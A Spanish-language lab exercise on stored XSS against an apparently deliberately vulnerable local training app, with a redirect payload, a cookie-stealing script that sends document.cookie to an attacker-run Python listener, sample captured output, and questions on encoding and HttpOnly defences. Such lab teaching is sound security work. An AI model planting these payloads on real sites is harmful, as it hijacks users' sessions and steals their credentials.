# Laboratorio 04: Cross-Site Scripting (XSS) Almacenado Avanzado

## 🎯 Objetivo
Explotar una vulnerabilidad de XSS Persistente en el Foro o Chat para realizar ataques avanzados: redirección forzada de usuarios y exfiltración de cookies de sesión a un servidor externo.

## 📋 Prerrequisitos
1.  **Entorno:** Cadel Academy en Modo Vulnerable (`http://localhost:8080`).
2.  **Máquina Atacante:** Kali Linux (o similar con Python y Burp Suite).
3.  **Conectividad:** Asegúrate de que la máquina atacante y la víctima (servidor Docker) se ven entre sí.

---

## 📝 Ejercicio 1: Redirección Maliciosa (The Prank)

**Objetivo:** Inyectar un script que redirija a cualquier usuario que vea el post a un video de YouTube.

### Paso 1: Preparar la Interceptación (Opcional con Burp Suite)
1.  Abre **Burp Suite** en tu máquina atacante.
2.  Configura el navegador para usar Burp como proxy.
3.  Navega a la sección **Foro** (`/forum`) de Cadel Academy.
4.  Crea un nuevo tema. Rellena el título y el contenido con texto normal.
5.  Activa **"Intercept On"** en Burp Suite.
6.  Haz clic en "Publicar" en la web.

### Paso 2: Inyección del Payload
1.  En Burp Suite, verás la petición `POST /forum`.
2.  Localiza el parámetro `content` o `title`.
3.  Modifica el contenido para incluir el siguiente script JavaScript:
    ```html
    <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
    ```
4.  Haz clic en **"Forward"** para enviar la petición modificada.

### Paso 3: Verificación
1.  Desactiva la interceptación en Burp.
2.  Accede al Foro como un usuario normal (o refresca la página).
3.  **Resultado:** Deberías ser redirigido automáticamente a YouTube. ¡Has secuestrado la navegación del usuario!

---

## 📝 Ejercicio 2: Exfiltración de Datos (Cookie Stealing)

**Objetivo:** Robar la cookie de sesión (`user_id`) de la víctima y enviarla a tu servidor atacante.

### Paso 1: Configurar el Servidor Atacante (Listener)
Necesitamos un servidor que reciba los datos robados. Usaremos Python en tu máquina atacante (Kali).

1.  Abre una terminal.
2.  Averigua tu dirección IP (ej. `ip a` o `ifconfig`). Supongamos que es `192.168.1.50`.
3.  Inicia un servidor HTTP simple en el puerto 8000:
    ```bash
    python3 -m http.server 8000
    ```
    *Ahora tu máquina está esperando peticiones.*

### Paso 2: Construir el Payload
El script debe leer `document.cookie` y hacer una petición a tu IP.

**Payload:**
```html
<script>
  fetch('http://192.168.1.50:8000/?robado=' + document.cookie);
</script>
```
*(Reemplaza `192.168.1.50` por TU dirección IP real).*

### Paso 3: Inyección (Vía Chat o Foro)
1.  Ve al **Chat** (`/chat`) o crea otro post en el **Foro**.
2.  Pega el payload directamente en el campo de mensaje o contenido.
3.  Envía el mensaje.

### Paso 4: Captura de la Bandera (Flag)
1.  Simula ser la víctima: Refresca la página del chat o entra al post del foro.
2.  Observa tu terminal donde corre el servidor Python.
3.  Deberías ver una línea similar a:
    ```text
    172.18.0.1 - - [Fecha] "GET /?robado=user_id=1;%20security_level=vulnerable HTTP/1.1" 200 -
    ```
4.  **¡Éxito!** Has capturado la cookie `user_id=1`. Un atacante real usaría esto para suplantar al administrador.

---

## 🛡️ Preguntas de Reflexión

1.  **¿Por qué funciona `fetch` hacia otra IP?**
    *   Aunque existe CORS (Cross-Origin Resource Sharing), las etiquetas `<script>` o imágenes pueden generar peticiones GET salientes. CORS impide *leer la respuesta*, pero la petición (y los datos en la URL) ya han llegado al atacante.

2.  **¿Cómo evita esto el modo 'Seguro'?**
    *   Cambia al modo seguro y repite el ataque. Verás el código `<script>...` escrito en pantalla como texto. Esto es gracias al **Context-Aware Encoding** de Jinja2.

3.  **¿Qué hace la bandera `HttpOnly`?**
    *   Incluso si lograras inyectar el script, si la cookie tiene `HttpOnly` (como en el modo seguro), `document.cookie` devolvería una cadena vacía o parcial, protegiendo el identificador de sesión.